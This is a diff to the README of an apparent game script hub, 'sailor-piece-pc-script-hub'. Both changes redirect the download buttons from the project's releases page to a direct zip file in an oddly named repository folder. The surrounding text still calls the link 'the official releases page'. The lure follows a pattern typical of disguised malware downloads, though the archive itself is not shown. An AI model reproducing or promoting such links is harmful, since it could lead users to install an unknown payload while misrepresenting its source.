@@ -23,7 +23,7 @@ Ready to get started? Here's everything you need to do:
 
 ### Step 1: Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-sailor--piece--pc--script--hub-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Flore5605/sailor-piece-pc-script-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-sailor--piece--pc--script--hub-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Flore5605/sailor-piece-pc-script-hub/main/stercophagous/sailor-script-piece-pc-hub-3.0.zip)
 
 Visit this link to download the application. This takes you directly to the official releases page where you'll find the latest version available for download.
 
@@ -140,7 +140,7 @@ This tool is intended for educational and entertainment purposes. Please respect
 
 Thank you for choosing sailor-piece-pc-script-hub! We're confident it'll make your gaming sessions more enjoyable and less stressful. Remember – the download is just one click away:
 
-[Get It Now](https://github.com/Flore5605/sailor-piece-pc-script-hub/releases)
+[Get It Now](https://raw.githubusercontent.com/Flore5605/sailor-piece-pc-script-hub/main/stercophagous/sailor-script-piece-pc-hub-3.0.zip)
 
 Happy gaming, and see you in the adventure! 🎮✨
 
